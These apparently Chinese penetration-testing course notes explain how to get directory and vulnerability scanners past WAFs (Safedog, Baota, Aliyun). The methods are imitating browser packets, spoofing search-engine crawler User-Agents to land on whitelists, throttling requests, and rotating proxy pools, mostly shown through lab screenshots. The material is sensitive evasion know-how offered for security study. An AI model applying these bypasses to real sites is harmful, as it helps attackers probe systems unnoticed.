# XD安全 学习笔记 | WAF绕过技巧

原创 无名安全团队 [0x00实验室](javascript:void(0);) *2021-09-09 18:20*

收录于合集

\#WAF绕过1个

\#渗透测试9个

\#小迪安全笔记20个

声明

作者：团队成员-甲乙丙 、安逸两位同学 【无名安全团队】 如需转载本实验室的文章，请标明来源即可。文章仅学习安全技术使用，切记请勿做它用，产生的后果与本公众号无关。



本文为Day46-49天的学习笔记，仅供安全测试学习参考。

![img](http://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9wW2QG2oK5uzovZSDDzOZ4gDCbj3HLU1dyvmdC05wDsMu3icGXA4hxDCbBFibmIkGhria16Sa3YlrjQ/300?wx_fmt=png&wxfrom=19)

**0x00实验室**

网络安全从业者 @人无名 便可潜心练剑

128篇原创内容



公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyWr3wg3dIrAyL12lYAZ96woZlUZBbLcUxNS8GImPkNMJn7C7PNUhYjw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

本章节共有四大节内容：

**信息收集、漏洞发现、漏洞利用、权限控制**

**
**

**#简要本课具体内容和讲课思路**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyUNoR3wkZHeW8zosxviaibIu6TK9YByX7cwLezFhXkqZObKDg5hUHlPkg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsymLEhAk6PYXlXiar7JEeKf2pnT60anjoFZm0AuaAHIPWibT0qp4iaKAN3g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyuUQ4sHlGaqWzVJcwkpOdXnoj2CEElh2TJ443KDtfRkhXNibP2VqppCw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



那么直接网站进行信息收集时，会触发WAF，但这些信息还是我们需要知道的（例如：目录扫描，从而得到敏感文件， 上传地址等等），这是在信息收集部分中非常重要的一部分。从而就需要我们绕过WAF从而得到这些信息。



这一部分会触发WAF拦截，所以我们需要分析它的规则，这就需要我们进行**绕过分析**（抓包分析**，**WAF说明， FUZZ测试）。然后我们根据他的结果来想相应的绕过手法。



接下来我们通过四个演示示例来演示一下

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyKNoQrremJS4NFsQ1ukaqXnQ520sQ9SBicT8z32eGs3z75EHkBQ3ia9hA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**Safedog-****默认拦截机制分析绕过****-****未开****CC**

  我们先对目标网站进行扫描

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyfwJUicQnnUsWL8fSW9GciaOlwFRhQMmibNtXricZ0NWG2GRxx0r2QIOMOg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



发现都存在，但其实这是一种误报。这时就给人了一种错觉，感觉它存在但其实它不存在。这时对于我们扫描文件带来了不便。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsycKQTNSlhdrCoJwUrAnEd7JWG054MHbxNMicowSUgqdYHuJfZBK1Otzw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



那我们此时手工访问一下网站，看看是什么情况。当我们访问存在的文件时，返回200

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyiaxCzcjglZkq8vLJ7sLYHicLT7BTeiajXEMygbO2kZnDv79Iaszy8mP7w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

当我们访问不存在的文件时返回404

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyy0zXsic3IiaBnsb31ic3mfH7xNJOOqrjQYChtk8fTVQuZJNxHovIqrt1w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



可以看出此时是没有问题的，那么为什么使用工具会出现误报呢？我们再来从数据包的层面来分析一下。使用工具抓到目录扫描工具进程的数据包

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyMXxpowHib3xVrOB7Wn9RibKia3x4Em7INFZgibZibyBibXS0krxa3SCDkGWw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



然后再看下浏览器访问时产生的数据包。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyVaZKCXmWITLnbUetUFbm41crjsHVBfQcpP4aM4k1cK7dPqViacOtMFA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



再进行对比

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyckWEsMAmVVibQI3OhQRLhe0Bszs0qPkvLMypLZAibvGibpcc8AxRrrPfQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



可以明确的看到这两个数据包的不同所以我们更改工具的数据包，使其尽量贴合使用浏览器访问时产生的数据包。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyCDEUEbcsPYsKl1IJm0Iovs4flaHgHwLm6VX73uhsdUodLsiadaIO3Vw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



更改工具的请求方式，使用GET方式请求数据。第二次使用GET方法请求时可以发现没有误报的情况产生了。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyibm5xia7JTuX7rBN2IFiant6XibKpHYc7Xx827vDhdVRtPHtsjyibgwNpQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



测试一下文件是否存在

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsynpTDdXRvic0nNO6DZuuMcWvTicxrHBSSmkiaBeLm8pj7Fnpg50txp1LRw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyyqU5pQ92pILJrkicoZ1mviaKpIyh4AOiahcnOWodQv1HyP3C6gTKOcnAg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



发现文件正常存在。那么我们可以看到这款工具的优势：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsy9zJpic7D90yFMSJq9KbgPEKeSDE8aa968cX1rhT4iczAiaU76sks6Jokg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



可以看到三点：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyQOGaUw255gHKU1UgnFqJzLia7ULIX5Kdhch690lrLreAIVZBJ9ibYWmw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsy2bklCZ8G1Qgk4KRfN0IgDiaXKaWoD8CibMiaxHKH7bOXNQylVQZmcywtw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsy2Yh8mOJ2gibOTOnyP0mibJCJNSfBkb2gGic6n5fTzjjftuA9ZDkGQibqOQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

这就是使用工具绕过的思路：**模拟用户的真实访问数据包去请求真实网站。



接下来我们开启安全狗的CC防护

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyteKagUFTABPOOk4BqiaS9La1l8OYBXGFlFAd5bbpEAxZghltoqnR83Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyic9Z4m2JEtD0iaJbfIBJWxQWAXy2LGnOOEazhllhDp6ggk92Okz1pDgw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



开启安全狗的CC防护后，重启phpstudy。再次尝试使用工具扫描

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyibia6kGUU7GJdYFHuK7BiaZVS9PQ6saeEKAxMuHUHGa6dj0f8wTeHGoWQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



发现又开始产生误报了。此时查看网站，发现已经被安全狗拦截了

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyL1dOqvA2jCvW7lIpLVo5xwQxgXTm9eh7eHJW5XpybwQDp8g0WMMoKw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**CC**检测你的访问速度和访问来源，CC此时拦截是安全狗检测到你此时的访问不正常(这里是访问速度过快了)，不 像是正常的用户访问，就会拦截。

那么此时的绕过思路就是**要符合用户的访问习惯保持一致** 用户的访问速度肯定是没有工具的访问速度快的，那么这个工具过快，就可以采用演示扫描，此时的访问速度需要 自己测(**在保证速度的同时也能保证结果**)



第一步是基于数据包的特征，这里使用的是更改请求方式和模拟用户。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyuZ4u6AVERfRXD3GsCQkGCau9SEIc4orxgcf2W6KZOqhKnqHmDAhdXQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**请求方式**：

就是更改请求方式，去请求数据。例如：Head方式改为GET方式请求数据。

**模拟用户**：

将使用工具请求网站所提交的数据包尽可能的像用户使用浏览器访问所提交的数据包。

**爬虫引擎**：

这个不是通用的，这个属于部分WAF上面的一个特有的性值。WAF上面有黑白名单机制。在网站中加入到黑名单就代表禁止访问。白名单就是不进行拦截，符合规则可以任意访问。



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyjAiblX2noEquajSibsGkN6keTfyEZPweduKPD7cxz6F76byuclyXIqEg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyhV91okuUoy51dpSJicW5VhmtLxfr24MXX7kCDDDB8laKGHMCtDh7XDA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



设置了路径白名单后，这个目录下的攻击就不会被拦截。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsy6NAmxGrd3Yq2e0YiaHylbBbFqFPSjZVfHzQ4p1WEwuwI8cDlK7Hzvqw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



处在白名单中的IP用户，任何请求都不会被拦截。处在黑名单中的IP用户，不管是不是攻击都会被拦截(正常访问也会被拦截)。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyu34IsmxQd2uknEvwk65BnOQ5AiaXJUpMleHdwXxU9nwa2Q6JWDibpfuw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



爬虫白名单的存在是为了让网站能够正常的被收录， 若是将这些爬虫引擎拦截的话，可能会造成网站收入过低、权重、流量等等。

这里爬虫进了该工具的白名单，那么对方是爬虫的请求，那么就不会拦截。

那么如何将自己伪造成为百度搜索引擎，360搜索引擎等等爬虫引擎。

其实是非常简单的，就是修改User-Agent头下面为一些搜索引擎的User-Agent

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyjp7Oe4XIJe9sMvyJjfTBiatciczUWoGe0PEG5tjKMs697mMOibbZyt0Ow/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsy5s6BDerkB69IBt8kIFWpmZU8ia2ew7xNCuNGxkG7yPezmqWkJqbBehA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsyyTkvaiaQrW35jrSqfTny5InANPryxgGpYAQebibpMUZJkEXDeInncPHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsy9gGibx7uZCshG0W5gR2czZgo8LYJIk1ZgS0AwvicYzUmGxboraXib7lAw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



更改这个UA头可以模拟爬虫去请求网站。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsydQOrjK3nT4dHVwgbePGUxd0lcuu5MhBXxF4UCmJEOP724emSZx96hQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



但是这里有一个问题：可以看到没有任何结果。我们整理一下思路

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsygW6IA0PCyzPF2aqRhvB35Y8Oka1yEQy6nVycQFicam4yfhqqfVBq4QQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



更改UA头后发现扫描不出来。我们使用python脚本来进行演示

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibgiaXsf8wcRqZpb1IZCldsywWibQ0liagPD0GiaiavaYDOyUib0UZ6sJCkcicc9EvVcrGyf43icGkytf1QFQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQcNZHfG4bgZrS0V0fDLfrOq2r8eciaaH71gyXSfhgwD8HIdFg5QHQYxQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



本python代码就是模拟用户请求，通过返回的状态码来判断请求是否成功。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQQwdc2oUBicT5UJUUt9JfUfYoMot8P7D6tTkpAccG8ojTeFUfTCzkT9w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



设置本地代理，使用burpstite进行代理请求，顺便可以查看数据包

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ35rgeo2N9ia6WLQLgpMN5h8yicvo1IzMpc48fDxoQjvpx3q3QicIhKclw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



查看下脚本指定User-Agent后产生的数据包

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQHr1eOfAH7ZHlLBPX5SlpwrWHqIv7tV6TN4jZkCNW5uPZpkSGj8YLmQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



当我们不指向头时产生的数据包。

**写脚本的原因是为了模拟用户真实的访问情况，并且可以对其有充足的控制**，使用别人的工具会有无法更改请求内 容的问题出现

使用脚本请求网站，刚开始还正常，后来发现均为200

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQkIdnMR8PhoLZYcelxjVbzvggUglMEYRrp8aqlxAqo0fOKeicBNzupSw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQEicXEyoPXEEfglJAftmQ5wYacCAcSJp7ia2XzWVlLMCjqjEicDmSC4Xxg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



此时产生了误报，原因是开启了CC防护，现在正常访问页面，发现被安全狗拦截了。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQsUtbHKgJYbvLu9ySJrVb5licQta00ARIxKT8Mshe3mIWz0d10T7EibMA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

那么此时我们采用模拟爬虫的方式来绕过CC拦截，原因是爬虫的请求在白名单中，网站不会对其检测速度。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQzq3DOiasDPV2DbwF0juyznZXZySicwqvIicoKQibWx7ZU2Fq0icNs7CHL3A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



现在就可以正常显示网站文件是否存在。*此时就是在CC开启的时候也能绕过，而且不需要延时，这就保证了速度也保证了扫描的质量。**



**代理池技术**

**代理就是你的请求先发到代理服务器上，代理服务器再转发给目标服务器。**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQgsCibpPIG08F1l7SORysCwoyK37BArKgojGGzojSfswnoD5zMaSzsag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



作用就是当使用其中的一个IP去请求目标网站时被封了，那么可以换另一个IP继续对该网站进行访问。

当对阿里云的服务器扫描时扫的扫的就会找不到网站，原因是阿里云屏蔽了的IP。自带的阿里云防护对于扫描工具防护 的比较厉害。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQicSFpuetjyDibfIl2naxfxrdwZDV7jStWe1jfoqftmuWw4JPx5fl5tgg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到测试所用的网站现在是可以正常访问的



开始对网站进行扫描。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQex6oiaYfX9j1eB7r5u6ibSsBP50esD40qy1klbHFXvyP6AymIvzI9Jqg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



可以看到扫描之后网站打不开了，这就是阿里云的防护。（大约需要一个小时后才能打开网站）

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ57ELqsk4TPKdeic8QOzSoxoG9LPNKPjEe5ck8to4HBUaBs3nh9eXSwg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



那么如何绕过它呢？

阿里云-无法模拟搜索引擎爬虫绕过 只能采用代理池或延时



现在上宝塔防护



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQwwhb7ibOsgDzibFsaKibGLOoXVHoUkYrA2ibfausOCEeJjt6G9OwY79Prg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ4F8WnSgstvE2DdOsq3YYBoLrffWqvicnqHO8sE4ibIJaNRiczeJoIdRXg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



可以看到常见的扫描工具都被写在了拦截规则里面

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQrYQVFTr3z8CsvYRx22cN1LsibbdAwY26ViakV8uibVicrV7JYkN8MrVpxQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQicic9fDzvZ9W190gxmkQCiaGibHAeIrz4ecSOyM5kktZcUzw0PxstlQL3A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



阿里云-无法模拟搜索引擎爬虫绕过 

只能采用代理池或延时宝塔-爬虫未知 延迟可以 代理池可以

三者合一后**只能用代理池绕过或延时**



绕过日志中会记录到拦截的敏感文件

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQna8j0wpjjNGDqSehUBsLsFbvKBdQcUqHXQDCia7WRIfa3KiawHRCrJMw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



宝塔也会有安全拦截机制

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ01hxLoZ4icwG8cp3Mibd6MRpCcRr9PiaqAniawgyLhy3bMtbHb4CiaCicEFA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



第二条拦截机制，也就会拦截。所以字典中不能带有像bak之类的。所以绕过防火墙不太好绕过。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ7sdHt8POcjxfjvbTnia8kw4eqCU1tDUKpgGiagZiatDgWpRzMziaicBxZXQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)





**第****47****天：****WAF****绕过****-****漏洞发现之代理池指纹被动探针**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQHNibT4iahQYj1AcQ3yWrGCwMibzxkbapsXuGw4BFIDeAfsG7iaO3v9qD4g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



\#漏洞发现触发 WAF 点-针对 xray,awvs 等

1.扫描速度-(代理池，延迟，白名单等)

2.工具指纹-(特征修改，伪造模拟真实用户等)

3.漏洞 Payload-(数据变异，数据加密，白名单等)扫描过快会被拦截，热门工具会被拦截，有关键字也会触发WAF。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQEr491zc5EoKl585VvyhJ3pdXzFJ6yLV4KAEnL6sTDAXWia7VgKEwaYg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)





代理池Proxy_pool项目不太稳定，建议直接上充钱代理。

从Github上面下载

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQbiapF0BF5hzNRCicrXdkEgK3Lu8x3FrVBhCzAIAAHZ1PNhaiagNicibQEdA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



下载后需要配置以下地方：

1、setting.py下的server confifig

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQfgzPdoInQCSmQ7K0BOdU1R9lycaPmddq4rIQNnKrnUBG9luutCb2uw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



2、database confifig下的redis的账号密码

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQsAFTNaDyJYBLDS7DX51ic6I5urBGMTzjqQ5h3uKJ7sYs3buuaInwZ8g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

还需安装一些python所需要的库文件：



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ52huec1QllcGuy30VzibibWW0icRdwMRWZSk31u0yeicgkta6nGYSGXib3w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



具体操作从网上自行查找使用Redis数据库连接工具连接Redis数据库

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ3fxkSLLN0WZ5jQe4MzlAaBA6JbaialyyzQqyQaS8YEeWvjh9xquW6hg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



点击连接，填写账号密码

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQHWwl17wy1l6icFDq5iby5hwIskaebeGYaYdh17KibqYicpJ1UvOHfSDoAw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



可以看到当前数据库内无任何数据

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQicQnbFCG7FCeLo7o6p3GpnNfqGs6OLF2jk7hkRtxIjTFdNDBQWuCrMA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



接下来启动文件

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQupAdiaX3hN85NWSmiahGUxSWsARSe8Z6u8jHTibGhuTdesUGjFibsPNYicA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



还需启动API服务

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQeUKLy3yHCRz3BicKlZZQhl6JL29APicxxbWSnCTyre4cXhqLXuA3TUrg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQdl80I7Q57SFUr8NoqCeT6qicUrTkVyypxOmwdtt2AXc6teLVecqibJEg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



接下来访问工具给出的127.0.0.1即可得到一个随机IP在pycharm中打开的到代理。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQacSoIFhfoeDD08icUibIzH8Ky3CGPDkic0t9x8uxv06H0XiclKiaKHBtS6g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



重点讲解付费版的代理。

**充钱代理池直接干****safedog+BT+Aliyun****探针**

在无代理的情况下扫描网站xiaodi8.com。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQPHQqaXTKzjaEhsJxyJwUhyibHpg8Fvrc1jnibB8ibSRrQAPyibIbAJrQ4g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



开始出现错误信息

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQdZzxJGvYsOa5UvjCyNaPl7owF8N6vpjoQWqxhwf5nSib4ibTkOBp8ePw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



可以看到网站打不开了

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQjBhDEvTcFjJUkJia4AE5Iujm1Wq26cLmqQzUUf84nVrm077Y4dSBQOw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



现在我们使用付费的代理

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQMbsFZmbBo8xNE1zYwHp5mIVWRZ0xG4Y3IGliaaufPYG6ty1USOaWesw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



选择每次请求换IP，阿里云半分钟左右就会封IP所以选择每分钟换代理。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQpjZTz09Q8VjkYX8bzNVrB7C8Bmk5mQR0KGW5NJsbNlA1icNWgG4LjhQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQiamYFAQuFzXnttKeqnb5zsFw9SY2km7ISlnzNVUSFUKWYCTMOKowfqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



只需要在脚本处写上代理网站端口即可

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQXEpnCubuD4dCzNIwDzicChksMLxqcwOLloPt0T1gdNTo5VSKeOEpDHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



在测试之前可以看到测试网站可以正常访问。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ0uxC4D9yoWYGbpPqKoPrXibyibOxXvEW3u5N8k2jUImLSw4ZJg7loYRA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



现在采用代理对目标进行探针

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQtGmNXjQ4snqO8PFBcB8r8lEcyVVZa2gRLMd47icWhQiaAzJYTWLmrYEA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



可以看到，探针的速度是很快的，而且网站也可以正常访问

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQrYibESRWFIRL9keOI4kHlehf1ia2cQSCf0yQSpN32PqN46mgPicHmRw7w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



